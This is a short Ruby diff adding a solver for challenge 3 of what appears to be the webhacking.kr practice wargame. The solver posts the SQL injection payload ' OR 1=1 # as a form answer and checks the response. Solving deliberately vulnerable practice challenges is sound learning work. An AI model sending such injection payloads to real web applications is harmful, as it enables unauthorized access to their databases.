@@ -131,6 +131,27 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 3
+  class Challenge3 < ChallengeBase
+    CHALLENGE = 3
+
+    PATH = '/challenge/web-03/'
+    PAYLOAD = %q[' OR 1=1 #]
+
+    def exec
+      log('Submitting answer')
+      response = post(
+        PATH,
+        {
+          'answer' => PAYLOAD,
+          'id' => @wargame.user_id
+        }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 4
   class Challenge4 < ChallengeBase
     CHALLENGE = 4
